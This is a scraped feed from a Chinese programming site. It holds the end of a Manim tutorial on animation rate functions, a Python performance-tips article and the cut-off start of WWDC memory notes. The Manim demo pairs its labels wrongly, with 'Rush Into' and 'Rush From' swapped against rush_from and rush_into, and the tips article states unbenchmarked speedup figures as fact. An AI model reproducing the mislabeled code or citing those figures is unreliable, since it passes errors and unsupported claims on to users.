<h2 data-id="heading-5">3. 动手写个 Demo</h2>
<p>光说不练假把式。下面的示例代码可以直观感受不同函数的区别：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> manim <span class="hljs-keyword">import</span> *


<span class="hljs-keyword">class</span> <span class="hljs-title class_">RateFuncComparison</span>(<span class="hljs-title class_ inherited__">Scene</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">construct</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 定义我们想对比的函数</span>
        funcs = [
            linear,
            smooth,
            rush_from,
            rush_into,
            there_and_back,
            rate_functions.ease_out_bounce,
        ]
        labels = [
            <span class="hljs-string">"Linear"</span>,
            <span class="hljs-string">"Smooth"</span>,
            <span class="hljs-string">"Rush Into"</span>,
            <span class="hljs-string">"Rush From"</span>,
            <span class="hljs-string">"There &amp; Back"</span>,
            <span class="hljs-string">"Bounce"</span>,
        ]

        <span class="hljs-comment"># 创建圆点和文字</span>
        group = VGroup()
        <span class="hljs-keyword">for</span> i, (func, label_text) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(funcs, labels)):
            dot = Dot(color=TEAL)
            label = Text(label_text, font_size=<span class="hljs-number">20</span>).next_to(dot, LEFT)
            row = VGroup(label, dot)
            group.add(row)

        <span class="hljs-comment"># 竖直排列</span>
        group.arrange(DOWN, buff=<span class="hljs-number">0.5</span>).to_edge(LEFT)
        self.add(group)

        <span class="hljs-comment"># 制作动画：让所有点同时向右移动</span>
        <span class="hljs-comment"># 注意：我们在这里分别指定了不同的 rate_func</span>
        anims = []
        <span class="hljs-keyword">for</span> item, func <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(group, funcs):
            dot = item[<span class="hljs-number">1</span>]  <span class="hljs-comment"># 获取组里的 Dot</span>
            anims.append(dot.animate(rate_func=func, run_time=<span class="hljs-number">3</span>).shift(RIGHT * <span class="hljs-number">4</span>))

        self.play(*anims)
</code></pre>
<p>运行后你会发现，虽然大家的 <code>run_time</code> 都是3秒，移动距离一样，但“性格”截然不同。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba75cc74f304474baa5bc441daa970b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764484065&amp;x-signature=tRI%2BaQnQbSKGg%2FU0%2B9Y7jkVccUU%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-6">4. 进阶：自定义与时间扭曲</h2>
<p>作为会 <code>Python</code> 的老手，如果内置函数满足不了你怎么办？</p>
<h3 data-id="heading-7">4.1. 自定义函数 (Lambda大法)</h3>
<p><code>rate_func</code> 接受任何一个 <code>Python</code> 函数。</p>
<p>比如，你想做一个简单的“先慢后快”的加速效果，可以直接用 <code>Lambda</code>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># y = x^2，典型的加速曲线</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomRateFuncDemo</span>(<span class="hljs-title class_ inherited__">Scene</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">construct</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 创建一个圆</span>
        circle = Circle(radius=<span class="hljs-number">0.5</span>, color=BLUE).shift(LEFT * <span class="hljs-number">2</span>)
        self.add(circle)

        <span class="hljs-comment"># 使用自定义 rate_func（t**2）让圆向右移动</span>
        self.play(circle.animate(rate_func=<span class="hljs-keyword">lambda</span> t: t**<span class="hljs-number">2</span>).shift(RIGHT * <span class="hljs-number">4</span>), run_time=<span class="hljs-number">3</span>)
        self.wait()
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c07fdccfbf142568d474d62018e7bea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764484065&amp;x-signature=EOzMezuJmYbGmcZSqkTb%2F%2BWPbYs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">4.2. 时间挤压 (Squish Rate Func)</h3>
<p>这是 <code>Manim</code> 中最强大的黑科技之一：<code>squish_rate_func</code>。</p>
<p>假设你写了一个 <code>run_time=6</code> 的动画，但你希望某个特定的变换（比如变色），</p>
<p>在第 <code>1.2</code> 秒到第 <code>3</code> 秒之间（即整个进度的 <code>0.2</code> 到 <code>0.5</code>）由<strong>白色</strong>变成<strong>红色</strong>；</p>
<p>在第 <code>3</code> 秒到第 <code>4.8</code> 秒之间（即整个进度的 <code>0.5</code> 到 <code>0.8</code>）由<strong>红色</strong>变成<strong>绿色</strong>。</p>
<p>你不需要把动画拆成多段写，只需要：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SquishRateFuncDemo</span>(<span class="hljs-title class_ inherited__">Scene</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">construct</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># 创建一个圆点</span>
        dot = Dot(color=WHITE).shift(LEFT * <span class="hljs-number">2</span>)
        self.add(dot)

        <span class="hljs-comment"># 使用UpdateFromAlphaFunc来同时控制位置和颜色变化</span>
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_dot</span>(<span class="hljs-params">obj, alpha</span>):
            <span class="hljs-comment"># 位置变化 - 使用默认的linear速率</span>
            obj.move_to(LEFT * <span class="hljs-number">2</span> + RIGHT * <span class="hljs-number">5</span> * alpha)

            <span class="hljs-comment"># 颜色变化 - 使用squish_rate_func控制变色的时间段</span>
            squished_alpha = squish_rate_func(smooth, <span class="hljs-number">0.2</span>, <span class="hljs-number">0.5</span>)(alpha)
            squished_alpha2 = squish_rate_func(smooth, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.8</span>)(alpha)

            <span class="hljs-keyword">if</span> alpha &lt; <span class="hljs-number">0.5</span>:
                obj.set_color(interpolate_color(WHITE, RED, squished_alpha))
            <span class="hljs-keyword">else</span>:
                obj.set_color(interpolate_color(RED, GREEN, squished_alpha2))

        self.play(
            UpdateFromAlphaFunc(dot, update_dot),
            run_time=<span class="hljs-number">6</span>,
        )
        self.wait()
</code></pre>
<p>这个技巧在制作复杂的多重同步动画时非常有效！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cb02575866740e7bbb2979d4f804ddc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764484065&amp;x-signature=3Y3bARnc7xdiRnomMl05wftOnVg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">5. 总结</h2>
<p><code>Manim</code> 不仅仅是动画工具，它更像是一个导演工具。</p>
<ul>
<li><code>linear</code> 是为了表现机械、循环。</li>
<li><code>smooth</code> 是为了表现自然、物理。</li>
<li><code>there_and_back</code> / <code>wiggle</code> 是为了引导观众的注意力。</li>
<li><code>squish_rate_func</code> 是为了精准控制时间轴。</li>
</ul>
<p>下次当你的动画看起来略显生硬时，不妨停下来想一想：<em>“这个动作的节奏对吗？是不是该换个 rate function 了？”</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python性能提升50%：这5个隐藏技巧让你的代码快如闪电⚡]]></title>    <link>https://juejin.cn/post/7575106644498923554</link>    <guid>https://juejin.cn/post/7575106644498923554</guid>    <pubDate>2025-11-23T04:16:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575106644498923554" data-draft-id="7575162322239700992" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python性能提升50%：这5个隐藏技巧让你的代码快如闪电⚡"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-11-23T04:16:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IT_陈寒"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python性能提升50%：这5个隐藏技巧让你的代码快如闪电⚡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT_陈寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:16:58.000Z" title="Sun Nov 23 2025 04:16:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Python性能提升50%：这5个隐藏技巧让你的代码快如闪电⚡</strong></h2>
<h3 data-id="heading-1">引言</h3>
<p>Python因其简洁易读的语法和强大的生态系统而广受欢迎，但它的性能问题也常常成为开发者诟病的焦点。尽管Python的解释型特性使其在运行时效率上不如C或Rust等编译型语言，但通过一些高级技巧和优化手段，我们仍然可以显著提升Python代码的执行速度——在某些情况下甚至能达到50%以上的性能提升！</p>
<p>本文将深入探讨5个鲜为人知但效果显著的Python性能优化技巧，涵盖从数据结构选择到底层字节码优化的多个层面。无论你是处理大规模数据还是编写高频调用的微服务，这些技巧都能帮助你榨干Python的最后一滴性能潜力。</p>
<hr/>
<h3 data-id="heading-2">1. 利用内置函数和标准库</h3>
<h4 data-id="heading-3">为什么有效？</h4>
<p>Python的内置函数（如<code>map()</code>、<code>filter()</code>、<code>sum()</code>）是用C实现的，比纯Python实现的循环快得多。标准库中的模块（如<code>collections</code>、<code>itertools</code>）也经过了高度优化。</p>
<h4 data-id="heading-4">实战示例</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 慢速版本：纯Python循环</span>
result = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):
    result.append(i * <span class="hljs-number">2</span>)

<span class="hljs-comment"># 快速版本：内置map函数</span>
result = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x * <span class="hljs-number">2</span>, <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>)))
</code></pre>
<p><strong>性能对比</strong>：在测试中，<code>map</code>版本比循环快约30%-40%。如果结合生成器表达式（如<code>(x*2 for x in range(1000000))</code>），内存占用还会进一步降低。</p>
<h4 data-id="heading-5">进阶技巧</h4>
<ul>
<li>使用<code>collections.deque</code>代替列表实现队列操作（O(1) vs O(n)）。</li>
<li><code>itertools.chain</code>合并多个迭代器时比显式循环更高效。</li>
</ul>
<hr/>
<h3 data-id="heading-6">2. 避免全局变量，拥抱局部作用域</h3>
<h4 data-id="heading-7">Python的变量查找机制</h4>
<p>Python在访问变量时会按顺序查找：局部作用域 -&gt; 闭包 -&gt; 全局 -&gt; 内置。全局变量的查找成本远高于局部变量。</p>
<h4 data-id="heading-8">优化案例</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 慢速版本：频繁访问全局变量</span>
global_var = [...]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> global_var:
        do_something(item)

<span class="hljs-comment"># 快速版本：将全局变量转为局部</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data_fast</span>(<span class="hljs-params">data</span>):
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data:
        do_something(item)
</code></pre>
<p><strong>性能提升</strong>：实测中这种改动可带来10%-20%的速度提升，尤其在循环次数多的情况下。</p>
<h4 data-id="heading-9">深层原理</h4>
<p>字节码层面的差异：</p>
<ul>
<li><code>LOAD_GLOBAL</code>操作码需要哈希表查找。</li>
<li><code>LOAD_FAST</code>直接通过数组索引访问局部变量。</li>
</ul>
<hr/>
<h3 data-id="heading-10">3. JIT编译的魔法：PyPy与Numba</h3>
<h4 data-id="heading-11">PyPy的优势</h4>
<p>PyPy是Python的即时编译（JIT）实现，特别适合长时间运行的算法密集型任务（如数值计算）。某些场景下可比CPython快5-10倍！</p>
<h4 data-id="heading-12">Numba的精准打击</h4>
<p>Numba通过装饰器将特定函数编译为机器码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> numba <span class="hljs-keyword">import</span> jit

<span class="hljs-meta">@jit(<span class="hljs-params">nopython=<span class="hljs-literal">True</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">sum_array</span>(<span class="hljs-params">arr</span>):
    total = <span class="hljs-number">0.0</span>
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> arr:
        total += x
    <span class="hljs-keyword">return</span> total
</code></pre>
<p><strong>适用场景</strong>：数值计算、NumPy数组操作等，通常可提速50倍以上。但注意首次运行会有编译开销。</p>
<hr/>
<h3 data-id="heading-13">4. 内存视图（Memory Views）与缓冲协议</h3>
<h4 data-id="heading-14">Python的内存瓶颈</h4>
<p>当处理大型数据集（如图像、音频）时，传统的切片复制会引发大量内存分配操作。内存视图允许零复制访问底层缓冲区：</p>
<pre><code class="hljs language-python" lang="python">data = <span class="hljs-built_in">bytearray</span>(...)
view = <span class="hljs-built_in">memoryview</span>(data)
partial_view = view[<span class="hljs-number">1000</span>:<span class="hljs-number">2000</span>] <span class="hljs-comment"># Zero-copy!</span>
</code></pre>
<h4 data-id="heading-15">NumPy的最佳搭档</h4>
<pre><code class="hljs language-python" lang="python">arr = np.zeros(...)
arr_view = arr[:, :, ::<span class="hljs-number">2</span>] <span class="hljs-comment"># No data copied!</span>
</code></pre>
<p><strong>性能影响</strong>：在大数据处理中可减少90%以上的内存分配时间。这也是Pillow、OpenCV等库高性能的关键之一。</p>
<hr/>
<h3 data-id="heading-16">5. C扩展与Cython终极优化</h3>
<h4 data-id="heading-17">Cython的两栖特性</h4>
<p>Cython允许混合编写Python和C代码：</p>
<pre><code class="hljs language-cython" lang="cython"># cython: language_level=3
cimport numpy as np

def fast_sum(np.ndarray[np.float64_t] arr):
    cdef double total = 0.0
    cdef int i
    for i in range(arr.shape[0]):
        total += arr[i]
    return total
</code></pre>
<h4 data-id="heading-18">CPython API直接调用</h4>
<p>对于极端性能需求的部分：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// example.c</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Python.h&gt;</span></span>

<span class="hljs-type">static</span> PyObject* <span class="hljs-title function_">fast_func</span><span class="hljs-params">(PyObject* self, PyObject* args)</span> {
    <span class="hljs-comment">// C implementation here...</span>
}
</code></pre>
<p><strong>实测效果</strong>：经过良好优化的C扩展可比纯Python快100-1000倍（如加密算法、物理模拟）。著名的例子包括lxml、psycopg2等库的核心部分。</p>
<hr/>
<h3 data-id="heading-19">Bonus技巧：字符串操作的黑暗艺术</h3>
<ol>
<li>
<p><strong>join()战胜+运算符</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Bad: O(n²) time complexity!</span>
s = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> chunks:
    s += chunk

<span class="hljs-comment"># Good: O(n) with join()</span>
s = <span class="hljs-string">""</span>.join(chunks)
</code></pre>
</li>
<li>
<p><strong>f-string的秘密速度</strong><br/>
f-string不仅是语法糖——它还是最快的字符串格式化方式：</p>
<pre><code class="hljs language-perl" lang="perl">%timeit f<span class="hljs-string">"Value: {x}"</span>          <span class="hljs-comment"># ~80ns </span>
%timeit <span class="hljs-string">"Value: {}"</span>.format(<span class="hljs-keyword">x</span>)   <span class="hljs-comment"># ~150ns </span>
%timeit <span class="hljs-string">"Value: %s"</span> % <span class="hljs-keyword">x</span>         <span class="hljs-comment"># ~120ns </span>
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-20"><strong>总结与行动指南</strong></h3>
<ol>
<li><strong>优先选择标准库提供的工具</strong>——它们通常是最高效的实现。</li>
<li><strong>将热点代码移出全局作用域</strong>——哪怕只是封装到一个函数里。</li>
<li><strong>对计算密集型任务尝试JIT方案</strong>——PyPy/Numba可能带来质的飞跃。</li>
<li><strong>用内存视图替代数据复制</strong>——特别是处理二进制数据时。</li>
<li><strong>考虑用Cython/C扩展改写关键路径</strong>——当其他优化手段触顶时。</li>
</ol>
<p>记住："过早优化是万恶之源"（Knuth），但在确认真实的性能瓶颈后，这些技巧将成为你工具箱中的利器⚡</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[WWDC 21]Detect and diagnose memory issues 笔记]]></title>    <link>https://juejin.cn/post/7575152891955462144</link>    <guid>https://juejin.cn/post/7575152891955462144</guid>    <pubDate>2025-11-23T04:25:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575152891955462144" data-draft-id="7575090551357358132" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[WWDC 21]Detect and diagnose memory issues 笔记"/> <meta itemprop="keywords" content="Swift,性能优化"/> <meta itemprop="datePublished" content="2025-11-23T04:25:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="songgeb"/> <meta itemprop="url" content="https://juejin.cn/user/3122268752587006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [WWDC 21]Detect and diagnose memory issues 笔记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3122268752587006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    songgeb
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:25:06.000Z" title="Sun Nov 23 2025 04:25:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 